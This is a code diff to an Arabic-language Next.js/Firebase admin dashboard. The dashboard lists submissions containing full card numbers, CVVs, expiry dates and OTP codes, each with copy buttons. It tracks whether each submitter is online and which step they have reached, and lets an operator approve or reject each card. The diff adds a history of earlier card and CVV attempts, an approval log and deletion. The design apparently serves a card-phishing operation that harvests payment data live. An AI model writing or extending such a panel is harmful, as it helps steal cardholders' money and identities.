@@ -1,15 +1,15 @@
 'use client'
 
-import { useEffect, useRef, useState } from 'react'
+import { useEffect, useMemo, useRef, useState } from 'react'
 import { useRouter } from 'next/navigation'
 import { onAuthStateChanged, signOut, User } from 'firebase/auth'
 import { auth, db } from '@/lib/firebase'
-import { collection, onSnapshot, doc, updateDoc, query } from 'firebase/firestore'
+import { arrayUnion, collection, deleteDoc, onSnapshot, doc, updateDoc, query } from 'firebase/firestore'
 import { Card, CardContent, CardHeader, CardTitle } from '@/app/components/ui/card'
 import { Button } from '@/app/components/ui/button'
 import {
   CheckCircle, XCircle, Clock, User as UserIcon,
-  Phone, Shield, RefreshCw, LogOut, Wifi, Copy, Check
+  Phone, Shield, RefreshCw, LogOut, Wifi, Copy, Check, Trash2
 } from 'lucide-react'
 
 interface Submission {
@@ -21,13 +21,33 @@ interface Submission {
   datayaer: string
   CVC: string
   otpArr: string[]
-  cardState: 'pending' | 'approved' | 'rejected'
+  cardState: CardStateValue
   method?: string
   createdAt?: number
+  stateUpdatedAt?: number
   step?: number
   currentPage?: string
   onlineStatus?: 'online' | 'offline'
   lastSeenAt?: number
+  cardStateHistory?: CardStateHistoryEntry[]
+  cardDetailsHistory?: CardAttemptHistoryEntry[]
+}
+
+type CardStateValue = 'pending' | 'approved' | 'rejected'
+
+type CardStateHistoryEntry = {
+  state: CardStateValue
+  at?: number
+  by?: string
+}
+
+type CardAttemptHistoryEntry = {
+  cardNumber?: string
+  CVC?: string
+  dateMonth?: string
+  datayaer?: string
+  cardExpiry?: string
+  submittedAt?: number
 }
 
 const PAGE_LABELS: Record<string, string> = {
@@ -50,6 +70,19 @@ const STEP_LABELS: Record<number, string> = {
 }
 
 const PRESENCE_TIMEOUT_MS = 45000
+const ARABIC_DATE_TIME_FORMATTER = new Intl.DateTimeFormat('ar-QA', {
+  weekday: 'long',
+  day: 'numeric',
+  month: 'long',
+  year: 'numeric',
+  hour: 'numeric',
+  minute: '2-digit',
+})
+
+function formatArabicDateTime(timestamp?: number) {
+  if (!timestamp) return '—'
+  return ARABIC_DATE_TIME_FORMATTER.format(new Date(timestamp))
+}
 
 function resolveStepLabel(step?: number, currentPage?: string) {
   const pageLabel = currentPage ? PAGE_LABELS[currentPage] : undefined
@@ -65,6 +98,96 @@ function isSubmissionOnline(sub: Submission, nowTimestamp: number) {
     return nowTimestamp - sub.lastSeenAt <= PRESENCE_TIMEOUT_MS
   }
   return sub.onlineStatus === 'online'
+}
+
+function cardStateText(state: CardStateValue) {
+  if (state === 'approved') return 'مقبول'
+  if (state === 'rejected') return 'مرفوض'
+  return 'قيد المراجعة'
+}
+
+function cardStatePillClass(state: CardStateValue) {
+  if (state === 'approved') return 'bg-green-100 text-green-800 border border-green-200'
+  if (state === 'rejected') return 'bg-red-100 text-red-800 border border-red-200'
+  return 'bg-yellow-100 text-yellow-800 border border-yellow-200'
+}
+
+function getCardStateHistory(sub: Submission): CardStateHistoryEntry[] {
+  const raw = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory : []
+  const normalized = raw
+    .filter((entry): entry is CardStateHistoryEntry => !!entry && !!entry.state)
+    .map((entry) => ({
+      state: entry.state,
+      at: typeof entry.at === 'number' ? entry.at : sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+      by: entry.by,
+    }))
+    .sort((a, b) => (b.at ?? 0) - (a.at ?? 0))
+
+  if (normalized.length > 0) return normalized
+
+  if (sub.cardState === 'approved' || sub.cardState === 'rejected') {
+    return [{
+      state: sub.cardState,
+      at: sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+      by: undefined,
+    }]
+  }
+
+  return []
+}
+
+function formatAttemptExpiry(entry: CardAttemptHistoryEntry) {
+  if (entry.dateMonth && entry.datayaer) return `${entry.dateMonth}/${entry.datayaer}`
+  if (entry.cardExpiry) {
+    const [year, month] = entry.cardExpiry.split('-')
+    if (month && year) return `${month}/${year.slice(-2)}`
+  }
+  return '—'
+}
+
+function getCardAttemptHistory(sub: Submission): CardAttemptHistoryEntry[] {
+  const rawAttempts = Array.isArray(sub.cardDetailsHistory) ? sub.cardDetailsHistory : []
+  const normalized = rawAttempts
+    .filter((entry): entry is CardAttemptHistoryEntry => !!entry && !!entry.cardNumber)
+    .map((entry) => ({
+      cardNumber: (entry.cardNumber ?? '').replace(/\D/g, ''),
+      CVC: entry.CVC ?? '',
+      dateMonth: entry.dateMonth ?? '',
+      datayaer: entry.datayaer ?? '',
+      cardExpiry: entry.cardExpiry ?? '',
+      submittedAt: typeof entry.submittedAt === 'number' ? entry.submittedAt : sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+    }))
+    .sort((a, b) => (b.submittedAt ?? 0) - (a.submittedAt ?? 0))
+
+  if (normalized.length > 0) return normalized
+
+  if (sub.cardNumber || sub.CVC || sub.dateMonth || sub.datayaer) {
+    return [{
+      cardNumber: (sub.cardNumber ?? '').replace(/\D/g, ''),
+      CVC: sub.CVC ?? '',
+      dateMonth: sub.dateMonth ?? '',
+      datayaer: sub.datayaer ?? '',
+      cardExpiry: '',
+      submittedAt: sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+    }]
+  }
+
+  return []
+}
+
+function buildNotificationSignature(sub: Submission) {
+  const otpCount = Array.isArray(sub.otpArr) ? sub.otpArr.filter(Boolean).length : 0
+  const historyCount = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory.length : 0
+  const cardAttemptsCount = Array.isArray(sub.cardDetailsHistory) ? sub.cardDetailsHistory.length : 0
+  return [
+    sub.cardState ?? 'pending',
+    sub.step ?? '-',
+    sub.currentPage ?? '-',
+    sub.onlineStatus ?? '-',
+    otpCount,
+    historyCount,
+    cardAttemptsCount,
+  ].join('|')
 }
 
 function playDashboardNotificationSound() {
@@ -204,11 +327,12 @@ export default function Dashboard() {
   const [submissions, setSubmissions] = useState<Submission[]>([])
   const [dataLoading, setDataLoading] = useState(true)
   const [updating, setUpdating] = useState<string | null>(null)
+  const [deleting, setDeleting] = useState<string | null>(null)
   const [isOnline, setIsOnline] = useState(true)
   const [presenceNow, setPresenceNow] = useState(() => Date.now())
   const [streamStatus, setStreamStatus] = useState<'connecting' | 'live' | 'error'>('connecting')
   const hasLoadedOnceRef = useRef(false)
-  const previousSubmissionIdsRef = useRef<Set<string>>(new Set())
+  const previousSubmissionSignaturesRef = useRef<Map<string, string>>(new Map())
 
   useEffect(() => {
     const syncOnlineStatus = () => setIsOnline(navigator.onLine)
@@ -243,14 +367,22 @@ export default function Dashboard() {
       const data = snap.docs.map(d => ({ id: d.id, ...d.data() })) as Submission[]
       data.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0))
 
-      const incomingIds = new Set(data.map(item => item.id))
+      const incomingSignatures = new Map<string, string>()
+      for (const item of data) {
+        incomingSignatures.set(item.id, buildNotificationSignature(item))
+      }
+
       if (hasLoadedOnceRef.current) {
-        const hasNewSubmission = data.some(item => !previousSubmissionIdsRef.current.has(item.id))
-        if (hasNewSubmission) playDashboardNotificationSound()
+        const hasMeaningfulChange = data.some(item => {
+          const previousSignature = previousSubmissionSignaturesRef.current.get(item.id)
+          const currentSignature = incomingSignatures.get(item.id)
+          return !previousSignature || previousSignature !== currentSignature
+        })
+        if (hasMeaningfulChange) playDashboardNotificationSound()
       } else {
         hasLoadedOnceRef.current = true
       }
-      previousSubmissionIdsRef.current = incomingIds
+      previousSubmissionSignaturesRef.current = incomingSignatures
 
       setSubmissions(data)
       setDataLoading(false)
@@ -267,8 +399,32 @@ export default function Dashboard() {
 
   const updateState = async (id: string, state: 'approved' | 'rejected') => {
     setUpdating(id)
-    try { await updateDoc(doc(db, 'pays', id), { cardState: state }) } catch (e) { console.error(e) }
+    try {
+      const now = Date.now()
+      await updateDoc(doc(db, 'pays', id), {
+        cardState: state,
+        stateUpdatedAt: now,
+        cardStateHistory: arrayUnion({
+          state,
+          at: now,
+          by: user?.email ?? 'admin',
+        }),
+      })
+    } catch (e) { console.error(e) }
     setUpdating(null)
+  }
+
+  const deleteSubmission = async (id: string) => {
+    const ok = window.confirm(`هل تريد حذف الطلب رقم ${id} نهائياً؟`)
+    if (!ok) return
+    setDeleting(id)
+    try {
+      await deleteDoc(doc(db, 'pays', id))
+    } catch (error) {
+      console.error(error)
+      alert('تعذر حذف الطلب، حاول مرة أخرى.')
+    }
+    setDeleting(null)
   }
 
   const stats = {
@@ -278,6 +434,22 @@ export default function Dashboard() {
     approved: submissions.filter(s => s.cardState === 'approved').length,
     rejected: submissions.filter(s => s.cardState === 'rejected').length,
   }
+
+  const oldCardDetailsHistory = useMemo(
+    () => submissions
+      .flatMap((sub) => {
+        const attempts = getCardAttemptHistory(sub)
+        return attempts.slice(1).map((attempt) => ({
+          id: sub.id,
+          cardNumber: attempt.cardNumber ?? '',
+          CVC: attempt.CVC ?? '',
+          expiry: formatAttemptExpiry(attempt),
+          submittedAt: attempt.submittedAt,
+        }))
+      })
+      .sort((a, b) => (b.submittedAt ?? 0) - (a.submittedAt ?? 0)),
+    [submissions],
+  )
 
   const stateBadge = (s?: string) => {
     if (s === 'approved') return { label: 'مقبول', cls: 'bg-green-100 text-green-800 border border-green-200' }
@@ -349,6 +521,48 @@ export default function Dashboard() {
           ))}
         </div>
 
+        {!dataLoading && oldCardDetailsHistory.length > 0 && (
+          <Card className="border-0 shadow-sm bg-white">
+            <CardHeader className="pb-3">
+              <CardTitle className="text-base">سجل البطاقات القديمة (رقم البطاقة / CVV / الانتهاء)</CardTitle>
+            </CardHeader>
+            <CardContent>
+              <div className="space-y-2 max-h-72 overflow-auto pr-1">
+                {oldCardDetailsHistory.map((entry, i) => (
+                  <div key={`${entry.id}-${entry.submittedAt ?? 'na'}-${i}`} className="rounded-lg border border-slate-200 bg-slate-50 px-3 py-2 space-y-1.5">
+                    <div className="text-sm text-gray-700">
+                      رقم الهوية: <span className="font-mono font-semibold">{entry.id}</span>
+                    </div>
+                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs">
+                      <div className="rounded-md border border-gray-200 bg-white px-2 py-1.5">
+                        <div className="text-gray-400 mb-0.5">رقم البطاقة</div>
+                        <div className="font-mono text-gray-800 flex items-center">
+                          {formatCardDisplay(entry.cardNumber)}
+                          {entry.cardNumber && <CopyButton text={entry.cardNumber} />}
+                        </div>
+                      </div>
+                      <div className="rounded-md border border-gray-200 bg-white px-2 py-1.5">
+                        <div className="text-gray-400 mb-0.5">CVV</div>
+                        <div className="font-mono text-gray-800 flex items-center">
+                          {entry.CVC || '—'}
+                          {entry.CVC && <CopyButton text={entry.CVC} />}
+                        </div>
+                      </div>
+                      <div className="rounded-md border border-gray-200 bg-white px-2 py-1.5">
+                        <div className="text-gray-400 mb-0.5">تاريخ الانتهاء</div>
+                        <div className="font-mono text-gray-800">{entry.expiry}</div>
+                      </div>
+                    </div>
+                    <div className="text-xs text-gray-500">
+                      {formatArabicDateTime(entry.submittedAt)}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </CardContent>
+          </Card>
+        )}
+
         {dataLoading ? (
           <div className="py-20 text-center">
             <RefreshCw className="w-8 h-8 animate-spin text-[#8A1538] mx-auto mb-3" />
@@ -364,9 +578,12 @@ export default function Dashboard() {
             {submissions.map((sub) => {
               const { label, cls } = stateBadge(sub.cardState)
               const isUpdating = updating === sub.id
+              const isDeleting = deleting === sub.id
               const isPending = !sub.cardState || sub.cardState === 'pending'
               const online = isSubmissionOnline(sub, presenceNow)
               const stepLabel = resolveStepLabel(sub.step, sub.currentPage)
+              const stateHistory = getCardStateHistory(sub)
+              const oldCardAttempts = getCardAttemptHistory(sub).slice(1)
               const fullCard = (sub.cardNumber || '').replace(/\D/g, '')
               const groupedCard = fullCard.replace(/(.{4})/g, '$1 ').trim()
 
@@ -390,7 +607,7 @@ export default function Dashboard() {
                     </div>
                     {sub.createdAt && (
                       <span className="text-xs text-gray-400">
-                        {new Date(sub.createdAt).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })}
+                        {formatArabicDateTime(sub.createdAt)}
                       </span>
                     )}
                   </div>
@@ -423,9 +640,7 @@ export default function Dashboard() {
                             <InfoRow label="الخطوة الحالية" value={stepLabel} />
                             <InfoRow
                               label="آخر نشاط"
-                              value={sub.lastSeenAt
-                                ? new Date(sub.lastSeenAt).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })
-                                : '—'}
+                              value={formatArabicDateTime(sub.lastSeenAt)}
                             />
                           </div>
                         </div>
@@ -442,6 +657,44 @@ export default function Dashboard() {
                             <InfoRow label="CVV" value={sub.CVC} mono copyable />
                           </div>
                         </div>
+
+                        {oldCardAttempts.length > 0 && (
+                          <div>
+                            <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
+                              <Clock className="w-3.5 h-3.5" /> البطاقات القديمة
+                            </h3>
+                            <div className="bg-gray-50 rounded-xl p-4 border border-gray-100 space-y-2">
+                              {oldCardAttempts.map((attempt, index) => {
+                                const oldCardNumber = (attempt.cardNumber ?? '').replace(/\D/g, '')
+                                return (
+                                  <div key={`${oldCardNumber}-${attempt.submittedAt ?? 'na'}-${index}`} className="rounded-lg border border-gray-200 bg-white px-3 py-2 space-y-1.5">
+                                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs">
+                                      <div>
+                                        <div className="text-gray-400 mb-0.5">رقم البطاقة</div>
+                                        <div className="font-mono text-gray-800 flex items-center">
+                                          {formatCardDisplay(oldCardNumber)}
+                                          {oldCardNumber && <CopyButton text={oldCardNumber} />}
+                                        </div>
+                                      </div>
+                                      <div>
+                                        <div className="text-gray-400 mb-0.5">CVV</div>
+                                        <div className="font-mono text-gray-800 flex items-center">
+                                          {attempt.CVC || '—'}
+                                          {attempt.CVC && <CopyButton text={attempt.CVC} />}
+                                        </div>
+                                      </div>
+                                      <div>
+                                        <div className="text-gray-400 mb-0.5">تاريخ الانتهاء</div>
+                                        <div className="font-mono text-gray-800">{formatAttemptExpiry(attempt)}</div>
+                                      </div>
+                                    </div>
+                                    <div className="text-xs text-gray-500">{formatArabicDateTime(attempt.submittedAt)}</div>
+                                  </div>
+                                )
+                              })}
+                            </div>
+                          </div>
+                        )}
 
                         {sub.otpArr && sub.otpArr.filter(Boolean).length > 0 && (
                           <div>
@@ -462,10 +715,30 @@ export default function Dashboard() {
                           </div>
                         )}
 
+                        {stateHistory.length > 0 && (
+                          <div>
+                            <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
+                              <Clock className="w-3.5 h-3.5" /> سجل حالة البطاقة
+                            </h3>
+                            <div className="bg-gray-50 rounded-xl p-4 border border-gray-100 space-y-2">
+                              {stateHistory.map((entry, index) => (
+                                <div key={`${entry.state}-${entry.at}-${index}`} className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-1 rounded-lg border border-gray-200 bg-white px-3 py-2">
+                                  <span className={`inline-flex w-fit items-center rounded-full px-2.5 py-1 text-xs font-semibold ${cardStatePillClass(entry.state)}`}>
+                                    {cardStateText(entry.state)}
+                                  </span>
+                                  <span className="text-xs text-gray-500">
+                                    {formatArabicDateTime(entry.at)}
+                                  </span>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+
                         {isPending && (
                           <div className="flex flex-col sm:flex-row gap-3 pt-1">
                             <Button
-                              disabled={isUpdating}
+                              disabled={isUpdating || isDeleting}
                               onClick={() => updateState(sub.id, 'approved')}
                               className="flex-1 bg-green-600 hover:bg-green-700 text-white gap-2 h-10"
                             >
@@ -473,7 +746,7 @@ export default function Dashboard() {
                               قبول الطلب
                             </Button>
                             <Button
-                              disabled={isUpdating}
+                              disabled={isUpdating || isDeleting}
                               onClick={() => updateState(sub.id, 'rejected')}
                               className="flex-1 bg-red-600 hover:bg-red-700 text-white gap-2 h-10"
                             >
@@ -482,6 +755,18 @@ export default function Dashboard() {
                             </Button>
                           </div>
                         )}
+
+                        <div className="pt-1">
+                          <Button
+                            type="button"
+                            disabled={isDeleting || isUpdating}
+                            onClick={() => void deleteSubmission(sub.id)}
+                            className="w-full bg-gray-900 hover:bg-black text-white gap-2 h-10"
+                          >
+                            {isDeleting ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Trash2 className="w-4 h-4" />}
+                            حذف الطلب
+                          </Button>
+                        </div>
 
                         {!isPending && (
                           <div className={`rounded-xl p-3 text-center text-sm font-semibold ${
